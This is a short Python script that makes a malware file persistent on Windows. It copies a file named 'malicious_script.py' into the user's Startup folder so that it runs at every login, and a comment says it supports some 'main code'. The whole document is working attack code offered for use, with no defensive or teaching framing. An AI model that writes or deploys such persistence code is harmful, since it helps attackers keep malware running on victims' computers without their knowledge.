# This is only for the main code to work with
import shutil

import os

def create_persistence():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    malicious_script = os.path.join(os.getcwd(), "malicious_script.py")
    
    if not os.path.exists(startup_folder):
        os.mkdir(startup_folder)
    
    shutil.copy(malicious_script, os.path.join(startup_folder, "malicious_script.py"))
    print("Persistence mechanism set up.")

create_persistence()